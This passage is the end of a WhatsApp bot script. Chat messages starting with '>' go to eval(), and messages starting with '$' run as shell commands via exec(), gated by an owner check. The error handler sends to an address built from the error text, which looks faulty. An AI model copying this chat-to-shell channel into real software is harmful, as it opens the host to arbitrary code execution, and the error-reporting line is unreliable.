if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!daveshown) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!daveshown) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
  let error = err.stack || err.message || util.format(err);
  console.log('====== ERROR REPORT ======');
  console.log(error);
  console.log('==========================');

  await dave.sendMessage(`${error}@s.whatsapp.net`, {
    text: `⚠️ *ERROR!*\n\n📌 *Message:* ${err.message || '-'}\n📂 *Stack Trace:*\n${error}`,
    contextInfo: { forwardingScore: 9999999, isForwarded: true }
  }, { quoted: m });
}
}
//━━━━━━━━━━━━━━━━━━━━━━━━//
// File Update
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update File 📁 : ${__filename}`)
delete require.cache[file]
require(file)
})
